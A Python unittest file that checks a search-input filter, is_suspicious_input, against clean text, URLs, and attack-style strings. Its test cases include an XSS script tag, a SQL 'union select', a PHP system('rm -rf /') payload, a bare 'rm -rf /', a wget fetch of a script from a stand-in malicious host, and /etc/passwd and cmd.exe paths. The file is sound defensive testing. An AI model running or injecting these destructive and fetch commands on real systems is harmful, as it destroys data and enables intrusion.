import unittest
import sys
import os
from unittest.mock import patch, MagicMock

# Add the project directory to the Python path
project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_dir)

from app import is_suspicious_input


class TestSearchProtection(unittest.TestCase):

    def test_clean_input(self):
        """Test that clean text passes validation"""
        self.assertFalse(is_suspicious_input("python programming"))
        self.assertFalse(is_suspicious_input("how to code"))
        self.assertFalse(is_suspicious_input("web development tutorial"))
        self.assertFalse(is_suspicious_input("blog post about technology"))
        self.assertFalse(is_suspicious_input("search for articles"))

    def test_url_detection(self):
        """Test that URLs are detected"""
        self.assertTrue(
            is_suspicious_input("visit https://example.com for more info")
        )
        self.assertTrue(is_suspicious_input("go to www.gambling-site.com now"))
        self.assertTrue(
            is_suspicious_input("check out this site: example.com/path")
        )
        self.assertTrue(is_suspicious_input("click here http://malicious.com"))

    def test_code_detection(self):
        """Test that code patterns are detected"""
        self.assertTrue(
            is_suspicious_input("this is a test <script>alert('xss')</script>")
        )
        self.assertTrue(
            is_suspicious_input("run this: eval(document.forms[0])")
        )
        self.assertTrue(is_suspicious_input("try union select * from users"))
        self.assertTrue(
            is_suspicious_input("execute php code <?php system('rm -rf /') ?>")
        )
        self.assertTrue(is_suspicious_input("rm -rf /"))
        self.assertTrue(
            is_suspicious_input("wget http://malicious.com/script.sh")
        )

    def test_excessive_special_chars(self):
        """Test that excessive special characters are detected"""
        self.assertTrue(is_suspicious_input("%%%%%%%%%%%%%%@@@@@@@@@@@@"))
        self.assertTrue(is_suspicious_input("&&&&&&&&&&&&&&&&&&&&&&&&&"))
        # Should not trigger on normal punctuation
        self.assertFalse(
            is_suspicious_input(
                "This is a normal sentence with some punctuation!"
            )
        )
        # Should not trigger on short texts with special chars
        self.assertFalse(is_suspicious_input("C++"))

    def test_file_paths(self):
        """Test that file paths are detected"""
        # More explicit file paths that are more likely to be spam
        self.assertTrue(is_suspicious_input("/etc/passwd malicious code"))
        self.assertTrue(
            is_suspicious_input("C:\\Windows\\System32\\cmd.exe exploit")
        )


if __name__ == "__main__":
    unittest.main()
